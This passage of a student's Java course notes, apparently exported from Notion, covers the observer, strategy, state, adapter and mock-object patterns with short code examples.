 }</code></pre><h3 id="cc8ff64d-ec7f-4916-b5a1-e37812c3d556" class="">Avoid Optional</h3><p id="cb3cef44-0d1b-4669-8d1e-88daa02357a3" class="">just set the observer to one that does nothing when you run/update it</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="74e87fee-592f-4996-ab5d-7a310e3aac96" class="code"><code class="language-Java">abstract class Subject{
	 private Runnable ob = ()-&gt;{};
	 final protected void onChange(){ ob.run(); }
	 final public void attach(Observer o){ ob = o; }
	 final public void deattach(){ ob = ()-&gt;{}; }
}
class Bob extends Subject{ .. }</code></pre><h1 id="5b5639dc-5b79-4b8a-8a0b-2e27b1987875" class="">Multiple Observers</h1><h3 id="6695bd20-6356-4140-8506-51cc0e63a953" class="">new ArrayList of observers</h3><p id="f2cea787-63a3-4a33-b325-c7f7122164dc" class="">naive way to allow subject to store multiple observers is to store them in a list</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d6a9421-41d3-4894-b43b-98d942ee3fd2" class="code"><code class="language-Java">interface Observer{ void update(); }
abstract class Subject{
 private List&lt;Observer&gt; ob= new ArrayList&lt;&gt;();//Fragile solution
 final protected void onChange(){ ob.forEach( o-&gt;o.update() ); }
 final public void attach(Observer o){ ob.add(o); }
 final public void deattachAll(){ ob.clear(); }
}
class Bob extends Subject{..}
..
Bob bob= new Bob();
int[] tot1= {0};
int[] tot2= {0};
bob.eat(1);
bob.attach( ()-&gt; tot1[0] += 1 );
assert tot1[0] == 0 : &quot;Is this possible?&quot;;
bob.eat(1);
assert tot1[0] == 1 : &quot;first action&quot;;
bob.attach( ()-&gt; tot2[0] += 1 );//what if this operation was more involved?
...</code></pre><h3 id="12461ad4-e922-4056-b2e7-74ff4630aa96" class="">unmodifiable lists of observers</h3><p id="ceb8b467-db0c-4c58-a3bf-cc52acaaabd5" class="">this causes a problem when observers are added to the list while we are iterating through it and calling update method on all the observers and a ConcurrentModifcationException is thrown</p><p id="72358624-b514-4768-a6a2-0bb9546041a9" class="">to fix this, make the list an unmodifiable list and when adding an observer, set the ob field to a new list which concatenates the old list and a list of just the new observer</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8b19d86d-b39c-4213-9faa-05f07beb12d1" class="code"><code class="language-Java">interface Observer{ void update(); }
abstract class Subject{
 private List&lt;Observer&gt; ob= List.of(); //unmodifiable lists
 final protected void onChange(){ ob.forEach( o-&gt;o.update() ); }
 final public void attach(Observer o){ //replace on update
 ob = Stream.concat(ob.stream(),Stream.of(o)).toList();
 }
 final public void deattachAll(){ ob = List.of(); }
}
class Bob extends Subject{..}
..
Bob bob= new Bob();
int[] tot1= {0};
int[] tot2= {0};
bob.eat(1);
bob.attach( ()-&gt;tot1[0] += 1 );
bob.eat(1);
assert tot1[0] == 1 : &quot;first action&quot;;
bob.attach( ()-&gt;{ bob.attach(()-&gt;{}); tot2[0] += 1; } );//change here!
bob.eat(2); bob.eat(5);
//What happens now? On action, we add a new action to the list!
//If we do it by mutating an ArrayList under iteration, we get
//&#x27;ConcurrentModificationException&#x27;</code></pre><h3 id="3f91bbcf-0d85-48ca-acd9-e46ab24e45c4" class="">linked list of observers</h3><p id="9f750d7f-6127-48e2-8936-eee6f4db741b" class="">or we could just avoid lists in general and create a linked list like data structure, where we have a field for the head of the observer, and the body of that observer’s run method calls run on the previous observer </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="324d0527-6c0c-4fed-8261-266b0d856c4a" class="code"><code class="language-Java">abstract class Subject{
 private Runnable ob= ()-&gt;{};
 final protected void onChange(){ ob.run(); }
 final public void attach(Runnable o){
	 var oldObs= ob;
	 ob = ()-&gt;{ o.run(); oldObs.run(); };
 }
 final public void deattachAll(){ ob = ()-&gt;{}; }
}

//New Runnable calls both the new user provided Runnable and the
//old one.
//● Chain of behavior
//- Is this recursion?
// - Slow on very, very long chains of observers
// - Faster on short chains of observers! </code></pre><h3 id="83e32236-5224-4562-a588-2f6a726a2e62" class="">Generics and self method</h3><p id="a11d5bd9-ffa6-4020-98b5-6056af2bcd46" class="">subject and observer can be of generic types Subject and Message</p><p id="320e755d-2bf9-4494-94e4-8685df683408" class="">for this to work, we need to convince the type system by having an abstract method self that concrete observer subtypes needs to then define to return this (a pointer to itself) as an S</p><p id="8ba72950-4277-434c-b46b-bd23c54cd675" class="">when calling update on the observer we do <code>self(), m</code> instead of <code>this, m</code> because this is of type Subject&lt;S,M&gt; while self is of type S</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6b3c4982-9b20-4cab-ae3d-31584e3e47f0" class="code"><code class="language-Java">//S=Subject, M=Message
interface Observer&lt;S,M&gt;{ void update(S s, M m); }

abstract class Subject&lt;S,M&gt;{ //SOLUTION!
 private Observer&lt;S,M&gt; ob= (s,m)-&gt;{};
 protected abstract S self();
 final protected void onChange(M m){ ob.update(self(),m); }
 final public void attach(Observer&lt;S,M&gt; o){ ob = o; }
}

class Bob extends Subject&lt;Bob,Integer&gt;{
 int weight= 75;
 protected Bob self(){ return this; }
 void eat(int weight){
		 int oldW= this.weight;
		 this.weight += weight;
		 onChange(oldW);
 }
}
...//Now the code of the lambda can use Integer w0 and Bob p
bob.attach( (p,w0)-&gt;dietLog.add( &quot;From &quot; + w0 + &quot; to &quot; + p.weight ) );</code></pre></details></li></ul><ul id="03a23fc0-ddf0-47a6-a31a-e8524ddcadc0" class="toggle"><li><details><summary>Strategy Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="772076fb-dcdf-4584-922c-7a9692aeca9b"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">context object stores a strategy object with a method with behavior that differs depending on the implementation <ul id="a56c815a-d7c9-4aed-be32-7c3e9f613dbc" class="bulleted-list"><li style="list-style-type:disc">most direct implementation of dynamic dispatch</li></ul><figure id="9bc9d2af-caf2-4585-ba56-c0e3f16cf402" class="image" style="text-align:center"><a href="Untitled%203.png"><img style="width:480px" src="Untitled%203.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c7e3ed90-d3c2-4e50-b698-92feec1d8e92" class="code"><code class="language-Java">class Context{
		Strategy strat;
		void action(...){ strat.action(this, ...); }
}

interface Strategy{
		void action(Context context, ...);
}

class ConcreteStrategyA implements Strategy{
		void action(Context context, ...){
				...
		}
}

class ConcreteStrategyA implements Strategy{
		void action(Context context, ...){
				...
		}
}</code></pre></div></figure><h3 id="e1e984f8-bee7-4bff-accc-7d57a8f59b22" class="">Robot Example</h3><figure id="5f606c67-3431-49df-8d55-13c2b3011bab" class="image"><a href="Untitled%204.png"><img style="width:624px" src="Untitled%204.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="081cec5c-ae11-429b-ba1c-3708cdd47eb6" class="code"><code class="language-Java">//context
class RoboArm {
    GraspingStartegy startegy;
    //context passes itself into the method so that the strategy knows
    //about the caller
    void action(...){ startegy.action(this, ...); }
}

//startegy
interface GraspingStartegy { 
		//social interaction between objects by defining a method with 
		//related objects as the parameters.
		//then we can implement the body of the codel later
    void action(RoboArm robot, Kind k, Position p, Vector v, int impactTime);
}

//concrete strategys
class GraspStrongly implements GraspingStartegy {
  public void action(RoboArm robot, Kind k, Position p, Vector v, int time) {
      if (time &gt; 1000) { robot.arm.relaxToward(p, v); return; }
      if (time &gt; 2) { robot.palm.face(p, v); return; }
      robot.fingers.close(Strength.Max);
  }
}

class Dodge implements GraspingStartegy {
  public void action(RoboArm robot, Kind k, Position p, Vector v, int time) {
      ...
  }
}

//we can just use a lambda instead of defining a class that implements 
//graspingpolcity and store it as a local variable
//difference is that using a lambda makes access to the concrete object be 
//local, while the class can be accessed globally 
GraspingPolicy dodge = (robot, k, p, v, time)-&gt;{
		...
};</code></pre><h3 id="f7101152-2fc9-4373-b003-1868225527e5" class="">Method Parameter Based Strategy Pattern</h3><p id="9de3ed43-5f37-4451-bd29-53244a2d52cb" class="">pass strategy objects as method parameters rather than storing them in fields</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5231a544-75a4-425f-9c95-5b8ca157007f" class="code"><code class="language-Java">interface List&lt;T&gt;{
		//the predicate tells you when to remove the object
		//that predicate is a strategy 
		default boolean removeIf(Predicate&lt;? super E&gt; p){
				if (p.test(element)){/*remove it*/}
		}
}
//Here the lambda &#x27;x -&gt; x &gt; 5&#x27; is the strategy object, and tells the 
//method when to remove an element while iterating over the list.
myList.removeIf(x -&gt; x &gt; 5);</code></pre></details></li></ul><ul id="1033082c-bf4c-4f65-b77d-ffb2a9d24e81" class="toggle"><li><details><summary>State Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="9f80bd3c-583d-4959-aded-80c4bfcb620d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">actual object wraps a concrete <mark class="highlight-yellow_background">state object which defines behavior</mark><ul id="2cd8962c-9d2f-48b7-8a8e-81f3a75d09dd" class="bulleted-list"><li style="list-style-type:disc">behavior changes when when its internal state changes<ul id="6ccdeade-cdd5-4825-a5f5-7e9e13ad3edb" class="bulleted-list"><li style="list-style-type:circle">allows to emulate objects changing class at runtime </li></ul></li></ul><ul id="7ed4c200-4aa0-4b44-a359-418f769e3040" class="bulleted-list"><li style="list-style-type:disc">similar to the strategy pattern but with multiple methods</li></ul><figure id="ded64a23-4765-4d19-a524-367bc1115a19" class="image" style="text-align:center"><a href="Untitled%205.png"><img style="width:432px" src="Untitled%205.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5bc8441f-625c-4c59-b330-2b05804e2e77" class="code"><code class="language-Java">//actual object
public class Door{
		DoorState state = new ClosedDoor(); //state field
		//method behavior based on the state
		public boolean move(){state.move(this);}
		public boolean openD(){state.openD(this);}
		public boolean closeD(){state.closeD(this);}
}

//state type
public interface DoorState{
		public boolean move(Door d);
		public boolean openD(Door d);
		public boolean closeD(Door d);
}

//concrete state type
public class ClosedDoor implements DoorState{
		public boolean move(Door d){
				return true;
		}
		public boolean openD(Door d){
				return d.state.state = new OpenDoor();
		}
		public boolean closeD(Door d){
				return true;
		}
}</code></pre></div></figure><h3 id="54f3b964-94b3-4997-9af9-0cb7ef55453c" class="">Warrior Example</h3><ul id="5312c3ab-dff5-4ddf-994d-4449d27dfdfe" class="bulleted-list"><li style="list-style-type:disc">Warriors can fight each others;</li></ul><ul id="3acf3f85-c934-45ac-8f0f-f4ff595fe529" class="bulleted-list"><li style="list-style-type:disc">they can behave differently in different moments:<ul id="920b17ba-4f93-40ee-8c67-d6e94028d753" class="bulleted-list"><li style="list-style-type:circle">ready to fight -&gt; looks around carefully</li></ul><ul id="a3ba68c6-8462-4da5-857e-aea656290ca8" class="bulleted-list"><li style="list-style-type:circle">recovering -&gt; health grows up</li></ul><ul id="5a20ffd7-9039-44d3-ad96-01bf41bca5f7" class="bulleted-list"><li style="list-style-type:circle">death</li></ul></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="39ab35e9-c48e-48e9-906d-5f0befe609ec" class="code"><code class="language-Java">public class Warrior{
		int x; 
		int y;
		WarriorState state= new Recovering( MaxHealth / 2 );
		void ping(){ state.ping(this); }
		void damage(int i){ state.damage(this, i); }
		int attack(){ return state.attack(this); }
		void draw(Graphics g){ state.draw(this,g); }
 }
 
interface WarriorState {
		void ping(Warrior w);
		void damage(Warrior w, int i);
		int attack(Warrior w);
		void draw(Warrior w, Graphics g);
		}
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b59bf6aa-7e89-4e69-a3b2-4b68697c469c" class="code"><code class="language-Java">class Recovering implements WarriorState {

		int health; Recovering(int h){ health= h; }
		
		public void ping(Warrior w){
				health += 1;
				//Like changing class!
				if (health &gt;= MaxHealth){ w.state = new Ready(health, 0); }
		}
		
		public void damage(Warrior w, int i){
				health -= i;
				//chose next class! chose next class!
				if (health &lt;= 0){ w.state = new Dead(); }
				else { w.state = new Ready(health, 0); }
		}
		
		public int attack(Warrior w){
				w.state = new Ready(health, 0); //change class, and then use it!
				return w.attack();
		}
		
		public void draw(Warrior w, Graphics g){ /*...*/ }
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="399581f3-b390-4ead-94c7-10a57927afaf" class="code"><code class="language-Java">class Ready implements WarriorState {
 int health;
 int attack;
 Ready(int h, int a){ health= h; attack= a; }
 public void ping(Warrior w){
 if (attack &lt; MaxHealth){ attack += 1; }
 }
 public void damage(Warrior w, int i){
 health -= i;
 if (health &lt;= 0){ w.state = new Dead(); }
 }

 public int attack(Warrior w){ return attack; }
 public void draw(Warrior w, Graphics g) { /*...*/ }
}</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5a2b552a-b98f-41c6-b0f5-d60285692f85" class="code"><code class="language-Java">class Dead implements WarriorState {
 public void ping(Warrior w){}

 public void damage(Warrior w, int i){}

 public int attack(Warrior w){ throw new Error(&quot;...&quot;); }

 public void draw(Warrior w, Graphics g){ /*...*/ }
}

//By the way, Dead is an example of the Null Object Pattern! will see this later</code></pre></details></li></ul></details></li></ul><ul id="90534396-936f-4035-a210-7fde1fd512d2" class="toggle"><li><details><summary>Term Test 2</summary><ul id="7646c008-93e0-4ba5-bd2a-be6d05a44b01" class="toggle"><li><details><summary>Adapter Pattern</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1a559309-074f-4b2b-9912-e245cfc6d0ad"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">an object that <mark class="highlight-yellow_background">bridges two incompatible types/interfaces</mark><ul id="e91705ac-2068-4235-944d-bba53461af47" class="bulleted-list"><li style="list-style-type:disc">method <mark class="highlight-yellow_background">expects a target type</mark> but you have a different type</li></ul><ul id="aa9334b9-88f7-4b00-b696-172df3144cf8" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow_background">adaptee is wrapped by an adaptor object</mark> which extends the target interface</li></ul></div></figure><h3 id="0e9d76e6-11d1-4a9e-8d3a-cde047970922" class="">Adaptors with Lambdas</h3><p id="c98db243-0cb2-4284-acb5-98dd591ba96c" class="">lambdas can be an adaptor </p><ul id="f60ce596-fa7b-4dd2-b6e5-404b34008d90" class="bulleted-list"><li style="list-style-type:disc">extends the target/expected interface</li></ul><ul id="97beec61-0c6f-4446-95f5-b3109d207ff3" class="bulleted-list"><li style="list-style-type:disc">captures the adaptee using synchronies fields</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d8c7d089-705a-4303-922c-186d30daf6af" class="code"><code class="language-Java">static boolean of(List&lt;String&gt; ss, Function&lt;String,Boolean&gt; test){
		return ss.stream().allMatch(test);
		//expects a predicate, but has a function
}

static boolean of(List&lt;String&gt; ss, Function&lt;String,Boolean&gt; test){
		return ss.stream().allMatch(s-&gt;test.apply(s)); //lambda adaptor
		//adaptor object extends predicate
		//captures a single synthetic fields which is the adaptee
		//use function.apply to implement predicate.test
}</code></pre><h3 id="fb362687-68a2-4935-bd19-5965dd21fd3d" class="">Adaptors with Method Reference/Pointer <code>::</code> syntax</h3><p id="d22060f7-324c-49a0-8ac7-0c7d45769ae8" class="">adaptors can be represented as lambdas</p><p id="d1b9d434-2d11-4511-807c-e5cef7012bf6" class="">remember, <code>Type::method</code> syntax is just a lambda that extends Type and calls method</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a2c3e267-da8f-4dfc-bc8b-6075d05ae396" class="code"><code class="language-Java">record Point(int x, int y) {
  Point sum(Point p){ return new Point(x+p.x,y+p.y); }
}

enum Direction{
  Up    {Point toPoint(){return new Point( 1, 0);}},
  Down  {Point toPoint(){return new Point(-1, 0);}},
  Left  {Point toPoint(){return new Point( 0,-1);}},
  Right {Point toPoint(){return new Point( 0, 1);}};
  abstract Point toPoint();
}

public class Exercise {
  public static String points(Stream&lt;Point&gt;ps){
    return ps.map(s-&gt;s.toString()).collect(Collectors.joining());  
  }
  public static String names(Stream&lt;String&gt;ns){
    return ns.collect(Collectors.joining());  
  }

  public static void main(String[]a) {
    List&lt;Direction&gt; data1 = List.of(Direction.Up,Direction.Down);
    List&lt;Direction&gt; data2 = List.of(Direction.Left,Direction.Right);

    String s1 = names(data1.stream().map(Direction::name));
																			 //same as (d) -&gt; d.name()
    String s2 = points(data2.stream().map(Direction::toPoint));
    																		//same as (d) -&gt; d.toPoint()
    assert s1.equals(&quot;UpDown&quot;):&quot;assert1 &quot;+s1;
    assert s2.equals(&quot;Point[x=0, y=-1]Point[x=0, y=1]&quot;):&quot;assert2 &quot;+s2;
  }
}
        </code></pre></details></li></ul><ul id="e73e07c1-4b49-433b-ac12-8e4cc790eb60" class="toggle"><li><details><summary>Mocks </summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="b4badf24-e4f7-4bd5-9093-8178ef9f46e3"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">an object that provides the <mark class="highlight-yellow_background">minimum implementation of an interface</mark> to work in a specific case<ul id="508566c5-19ac-45c6-8dea-ef3805c9322e" class="bulleted-list"><li style="list-style-type:disc">type of adaptor</li></ul><ul id="cd4c0a51-274d-46cb-9542-e0bd8c02255f" class="bulleted-list"><li style="list-style-type:disc">one of the best uses for dynamic dispatch!</li></ul><ul id="15921e55-a5ef-44c4-9477-037ac974d0fc" class="bulleted-list"><li style="list-style-type:disc">often used for testing<ol type="1" id="c8820c18-1ae1-48fa-acdd-d20d3b852998" class="numbered-list" start="1"><li>create data</li></ol><ol type="1" id="002159f1-c79e-47a1-b9ad-ad52a38653a7" class="numbered-list" start="2"><li>run the operation</li></ol><ol type="1" id="2ca78090-97d4-4610-a4e4-872f3bc8ea32" class="numbered-list" start="3"><li>check that the result satisfy our exceptions</li></ol><ol type="1" id="d5f484d2-7ad8-4bfb-97f6-d2d08918d8e0" class="numbered-list" start="4"><li>with mock objects: check that the log satisfy our expectations</li></ol></li></ul></div></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ba8e0a9b-c0c5-4cc2-bf27-998646db4fbf" class="code"><code class="language-Java">//we have an interface
interface FileResource{
		void open();
		void close();
		String readAll();
}

//functionality that uses the interface
class Read{ 
		static String of(FileResource fr){
				fr.open();
				try{ return fr.readAll(); }
				finally{ fr.close(); }
		}
}

//we want to use read but with a string rather than the interface
//we also want to log operations called
//we&#x27;ll adapt a String/List&lt;String&gt; to a FileResource 
//use a mock object that adapts the string as the file resource
record StringMockFR(String readAll, List&lt;String&gt; log) implements FileResource{
 public void open(){ log.add(&quot;open&quot;); } 
 public void close(){ log.add(&quot;close&quot;); }
}

List&lt;String&gt; log = new ArrayList&lt;&gt;();
FileResource data1= new MockFR(&quot;a&quot;,log); //create mock objects
FileResource data2= new MockFR(&quot;bb&quot;,log); //they are our tests input!
FileResource data3= new MockFR(&quot;ccc&quot;,log);
assertEquals(&quot;a&quot;, Read.of(data1)); //check the behavior on the boundary (usual)
assertEquals(&quot;[open, close]&quot;, log.toString());//check internal behavior! (NEW!)
log.clear();//clear the log

//Rinse and repeat
assertEquals(&quot;bb&quot;, Read.of(data2));
assertEquals(&quot;[open, close]&quot;, log.toString());
log.clear();

assertEquals(&quot;ccc&quot;, Read.of(data3));
assertEquals(&quot;[open, close]&quot;, log.toString());
